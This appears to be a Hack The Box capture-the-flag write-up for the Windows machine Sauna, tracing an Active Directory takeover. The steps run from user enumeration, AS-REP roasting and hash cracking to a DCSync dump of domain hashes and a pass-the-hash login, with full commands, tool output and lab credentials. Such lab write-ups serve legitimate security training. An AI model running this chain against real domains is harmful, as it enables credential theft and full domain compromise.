---
title: "[HTB] Sauna WriteUp"
date: 2020-07-22T12:00:00-00:00
categories:
  - Hack The Box
excerpt: "Sauna is an easy Windows machine on Hack The box. A user is Kerberoastable which leads to a second user, then a DCSync attack leads to administrator."
tags:
  - HTB
  - Hack The Box
  - Sauna
  - WriteUp
  - Windows
---

![Sauna]({{ site.url }}{{ site.baseurl }}/assets/sauna/sauna.jpg)

Sauna is an easy Windows machine on Hack The box. A user is Kerberoastable which leads to a second user, then a DCSync attack leads to administrator.

Begin with an nmap scan.

```
nmap -sV -sC -oN nmap/nmap 10.10.10.175


# Nmap 7.80 scan initiated Mon May 18 20:41:01 2020 as: nmap -sV -sC -oN nmap/nmap 10.10.10.175
Nmap scan report for 10.10.10.175
Host is up (0.078s latency).
Not shown: 988 filtered ports
PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Egotistical Bank :: Home
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-05-19 03:45:31Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=5/18%Time=5EC2E4E6%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03");
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon May 18 20:45:47 2020 -- 1 IP address (1 host up) scanned in 285.85 seconds

```

A number of ports are open, I start with the website running on port 80.

Not much can be found on the website. The about page lists members of the team, we can use this to generate usernames.

![Meet the Team]({{ site.url }}{{ site.baseurl }}/assets/sauna/meettheteam.jpg)

I also ran ldapsearch against the machine, this reveals a user Hugo Smith, this turned out to be a rabbit hole, the real user we will need to go after is Fergus Smith.

`ldapsearch -h 10.10.10.175 -p 389 -x -b 'dc=EGOTISTICAL-BANK,dc=local' > ldapsearch.txt`

We can use [Kerbrute](https://github.com/ropnop/kerbrute) to find valid usernames based on the names on the website. First I create a text file with some common username formats, then run Kerbrute.

```bash
./kerbrute userenum --dc 10.10.10.175 -d EGOTISTICAL-BANK.LOCAL usernames.txt


[+] VALID USERNAME: administrator@EGOTISTICAL-BANK.LOCAL
[+] VALID USERNAME: FSmith@EGOTISTICAL-BANK.LOCAL
```

Kerbrute identifies administrator and FSmith. This user is kerberoastable, we can use the [impacket](https://github.com/SecureAuthCorp/impacket) script GetUserSPNs.py to get the TGT for FSmith.

```bash
$ python ./GetUserSPNs.py -dc-ip 10.10.10.175 -no-pass -k EGOTISTICAL-BANK.LOCAL/FSMITH

[*] Getting TGT for FSMITH
$krb5asrep$23$FSMITH@EGOTISTICAL-BANK.LOCAL:237e94674c738dc86e2b8033c54e259b$5f3de4694b4138fa0335eef7c60ccd8fa663e0be911497efcb80dcc211eaedebedfc1cc6aca1fa84b84a8968362093f3960128ba0dcae936c28bc9d674336f9556a8feb660103e5f0433e14ad0aa2552f57e7b65dc17a1447c51ddf9bf7535a0839184369058eed40ff444c15eee023abaa02581bc998025c7906f92d1599707a4d2b17a4f645716d961ae6a2ab6fdb0a027399b5756ea0394f8168a352a1fad39f61977581319b20078c5cea9f8333b4a1aedfe27b729299b429daec7c056e406ab0cff24f424c7b5f79baf702eedbe9dc164bc443b13d2671549510b25cc572b6def1fe10b152c74b42f324b2193d16e58c88ba8902a56d74182975a5f4e9b
```

We can then use john to crack the hash.

```bash
john FSMITHhash --fork=4 -w=/usr/share/wordlists/rockyou.txt 
```

We get The password `Thestrokes23`.

Now we can use Evil-winrm to log into the box.

```bash
evil-winrm -i 10.10.10.175 -u FSMITH -p Thestrokes23
```

C:\users\fsmith\desktop\user.txt


### Privilege Escalation 


Running winPEAS identifies a user svc_loanmanager which has autologon enabled and a default password.

```bash
  [+] Looking for AutoLogon credentials(T1012)
    Some AutoLogon credentials were found!!
    DefaultDomainName             :  EGOTISTICALBANK
    DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager
    DefaultPassword               :  Moneymakestheworldgoround!
```

We can open a new remote session as svc_loanmgr. (Under C:\users\ we see that the user logs in as svc_loanmgr not svc_loanmanager)

```
evil-winrm -i 10.10.10.175 -u svc_loanmgr -p Moneymakestheworldgoround!
```

We can now use Bloodhound to find potential paths to Domain Admin. 

```bash
bloodhound-python -u svc_loanmgr -p Moneymakestheworldgoround! -d EGOTISTICAL-BANK.LOCAL -ns 10.10.10.175 -c All
```

Looking through the bloodhound results we find that the svc-loanmgr user can leak password hashes from the Domain controller using a DCSync attack. This is done by impersonating a new Domain Controller and requesting synchronisation with the existing DC.

We can use another Impacket script to perform this attack.

```bash
$ secretsdump.py egotisticalbank/svc_loanmgr@10.10.10.175
Impacket v0.9.22.dev1+20200518.92028.525fa3d0 - Copyright 2020 SecureAuth Corporation

Password:
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:ec048b4c6a47762bb522a7a4d302670b:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:987e26bb845e57df4c7301753f6cb53fcf993e1af692d08fd07de74f041bf031
Administrator:aes128-cts-hmac-sha1-96:145e4d0e4a6600b7ec0ece74997651d0
Administrator:des-cbc-md5:19d5f15d689b1ce5
krbtgt:aes256-cts-hmac-sha1-96:83c18194bf8bd3949d4d0d94584b868b9d5f2a54d3d6f3012fe0921585519f24
krbtgt:aes128-cts-hmac-sha1-96:c824894df4c4c621394c079b42032fa9
krbtgt:des-cbc-md5:c170d5dc3edfc1d9
EGOTISTICAL-BANK.LOCAL\HSmith:aes256-cts-hmac-sha1-96:5875ff00ac5e82869de5143417dc51e2a7acefae665f50ed840a112f15963324
EGOTISTICAL-BANK.LOCAL\HSmith:aes128-cts-hmac-sha1-96:909929b037d273e6a8828c362faa59e9
EGOTISTICAL-BANK.LOCAL\HSmith:des-cbc-md5:1c73b99168d3f8c7
EGOTISTICAL-BANK.LOCAL\FSmith:aes256-cts-hmac-sha1-96:8bb69cf20ac8e4dddb4b8065d6d622ec805848922026586878422af67ebd61e2
EGOTISTICAL-BANK.LOCAL\FSmith:aes128-cts-hmac-sha1-96:6c6b07440ed43f8d15e671846d5b843b
EGOTISTICAL-BANK.LOCAL\FSmith:des-cbc-md5:b50e02ab0d85f76b
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes256-cts-hmac-sha1-96:6f7fd4e71acd990a534bf98df1cb8be43cb476b00a8b4495e2538cff2efaacba
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes128-cts-hmac-sha1-96:8ea32a31a1e22cb272870d79ca6d972c
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:des-cbc-md5:2a896d16c28cf4a2
SAUNA$:aes256-cts-hmac-sha1-96:d1fb5eefd5831287eb278c5eb24ef19dee6f40aa3917ea8581762066ba88ac3b
SAUNA$:aes128-cts-hmac-sha1-96:f6e1682022cd138a00262c4910a7944b
SAUNA$:des-cbc-md5:46b0434967132c4f
[*] Cleaning up... 
```

We can now use evil-winrm to pass the hash and login as Administrator.

```bash
evil-winrm -i 10.10.10.175 -u administrator -H :d9485863c1e9e05851aa40cbb4ab9dff

*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
```

C:\users\administrator\desktop\root.txt
